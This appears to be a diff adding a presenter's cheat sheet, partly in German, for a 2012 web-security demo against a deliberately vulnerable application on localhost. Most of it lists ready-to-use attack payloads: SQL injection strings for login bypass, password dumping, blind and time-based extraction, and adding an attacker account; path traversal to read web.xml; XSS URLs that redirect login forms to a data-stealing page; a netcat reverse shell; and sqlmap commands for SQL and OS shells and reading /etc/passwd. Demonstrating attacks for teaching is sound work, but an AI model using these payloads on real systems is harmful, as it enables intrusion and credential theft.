@@ -1,0 +1,171 @@
+== login data (ubuntu + mysql) ==
+
+confess
+confess2012
+
+
+== get sources ==
+
+git clone git://github.com/jakobk/confess-2012.git
+
+
+
+== mv htdocs ==
+
+htdocs$ sudo mkdir /var/www/confess
+htdocs$ sudo chown confess /var/www/confess
+htdocs$ mv * /var/www/confess
+
+
+== set up SDK in IntelliJ - openjdk 7 i363 ==
+
+Build --> Make Project --> New SDK --> ...
+--> restart IntelliJ
+
+
+== mysql als root laufen lassen ==
+
+/etc/mysql/my.cnf --> user = root
+
+
+
+
+
+== read web.xml ==
+
+http://localhost:8080/faces/javax.faces.resource/WEB-INF/web.xml?ln=..
+
+
+== ValueExpression injection vulnerability ==
+
+eh scho wissen
+
+
+
+
+
+
+
+== User Login ==
+
+asdf
+' OR 1=1;-- 
+
+
+== Product List --> Users - normal ==
+
+asdf' UNION SELECT id, username, password, 0 FROM user;-- 
+
+
+== Forgot password - semi blind ==
+
+admin@acme.com
+admin@acme.com' OR 1=1;-- 
+admin@acme.com' AND 1=0;-- 
+admin@acme.com' AND (SELECT substr(password, 1, 1) FROM user WHERE username='admin')='a';-- 
+admin@acme.com'; INSERT INTO user (username, password) VALUES ('attacker', 'attacker');-- 
+
+
+== Product Detail - unescaped injection ==
+
+?id=4 UNION SELECT id, username, password, 0 FROM user WHERE ascii(substr(username,1,1))=97
+
+
+== Product Edit - time based blind ==
+
+' WHERE id=2 AND (SELECT substr(password,1,1) FROM user WHERE username='admin')='a' AND BENCHMARK(10000000, encode('hello', 'goodbye'));-- 
+
+
+== XSS ==
+
+visible: http://localhost:8080/faces/pages/login.xhtml?msg=%3Cscript%3Ewindow.onload%20%3D%20function%28%29%20%7Bdocument.forms%5B0%5D.action%3D%27http%3A%2f%2flocalhost%2fconfess%2fsteal_data.php%27%3B%7D%3B%3C%2fscript%3E
+
+hidden: http://localhost:8080/faces/pages/login.xhtml?msg=%3Cscript%3Ewindow.onload%20%3D%20function%28%29%20%7Bdocument.forms%5B0%5D.action%3D%27http%3A%2f%2flocalhost%2fconfess%2fsteal_data_hidden.php%27%3B%7D%3B%3C%2fscript%3E
+
+
+== XSRF ==
+
+http://localhost/confess/fun-site.html
+
+
+== tomcat session ID ==
+
+Disable cookies!
+;jsessionid=B4E2CC86C13E61D589C2AEB94F5EBEE3
+
+
+== Reverse shell (PHP or Terminal) ==
+
+nc -l 1234
+
+mkfifo mypipe; cat mypipe | /bin/bash | nc localhost 1234 > mypipe
+
+
+== SQLMAP ==
+
+Key um vorhandene session zu ignorieren.
+--flush-session
+
+
+python sqlmap.py \
+-u "http://localhost:8080/faces/pages/internal/product_detail.xhtml?id=1" \
+-p "id" \
+--cookie="JSESSIONID=BE80D4A72CC9FF315CB5029BE5F21FD1" \
+--sql-shell
+
+
+python sqlmap.py \
+-u "http://localhost:8080/faces/pages/internal/product_detail.xhtml?id=1" \
+-p "id" \
+--cookie="JSESSIONID=BE80D4A72CC9FF315CB5029BE5F21FD1" \
+--tables
+
+
+
+
+python sqlmap.py -u "http://localhost/confess/show_product_name.php?id=1" -p id \
+--file-read="/etc/passwd"
+
+/var/www --> protected against mysqld on ubuntu
+
+
+### python sqlmap.py -u "http://localhost/confess/show_product_name.php?id=1" -p id --os-shell
+
+
+
+
+
+== buffer overflow ==
+
+anderes how-to!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
